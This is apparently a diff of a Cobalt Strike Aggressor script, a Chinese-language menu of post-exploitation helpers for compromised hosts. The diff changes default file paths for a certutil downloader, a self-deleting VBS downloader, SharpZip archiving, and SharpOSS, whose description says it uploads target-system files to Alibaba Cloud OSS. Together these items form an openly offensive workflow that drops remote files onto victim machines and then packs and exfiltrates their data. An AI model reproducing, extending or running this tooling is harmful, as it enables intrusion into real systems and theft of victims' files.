@@ -1,10 +1,10 @@
 menu "辅助模块" {
   item "certutil下载文件" {
     $bid = $1['@'];
-    $dialog = dialog("certutil远程下载", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
+    $dialog = dialog("certutil远程下载", %(url => "http://xxxx", path => "C:\\Users\\Public\\a", bid => $bid), &certutil);
     dialog_description($dialog, "certutil命令远程文件下载。");
     drow_text($dialog, "url", "远程文件地址: ");
-    drow_text($dialog, "path", "本地储存文件: ");
+    drow_text($dialog, "path", "本地储存位置: ");
     dbutton_action($dialog, "运行");
     dialog_show($dialog);
   }
@@ -16,7 +16,7 @@ menu "辅助模块" {
 
   item "vbs下载文件" {
     $bid = $1['@'];
-    $dialog = dialog("vbs下载文件", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
+    $dialog = dialog("vbs下载文件", %(url => "http://xxxx", path => "C:\\Users\\Public\\a", bid => $bid), &vbs);
     dialog_description($dialog, "vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。");
     drow_text($dialog, "url", "远程文件地址: ");
     drow_text($dialog, "path", "本地储存文件: ");
@@ -33,7 +33,7 @@ menu "辅助模块" {
 
   item "SharpZip(压缩文件夹)" {
     $bid = $1['@'];
-    $dialog = dialog("SharpZip压缩打包文件", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
+    $dialog = dialog("SharpZip压缩打包文件", %(file => "C:\\Users\\Public", path => "C:\\Users\\Public.zip", bid => $bid), &SharpZip);
     drow_text($dialog, "file", "file:  ");
     drow_text($dialog, "path", "path:  ");
     dialog_description($dialog, "对目录或文件进行压缩打包。项目地址：https://github.com/uknowsec/SharpZip");
@@ -47,7 +47,7 @@ menu "辅助模块" {
 
   item "SharpOSS(上传文件)" {
     $bid = $1['@'];
-    $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Windows\\Temp\\bak.zip", bid => $bid), &SharpOSS);
+    $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Users\\Public\\bak.zip", bid => $bid), &SharpOSS);
     dialog_description($dialog, "通过aliyun-oss-csharp-sdk快速上传目标系统文件到阿里云OSS。项目地址：https://github.com/uknowsec/SharpOSS");
     drow_text($dialog, "bucketName", "BucketName: ");
     drow_text($dialog, "accessKeyId", "AccessKeyId: ");
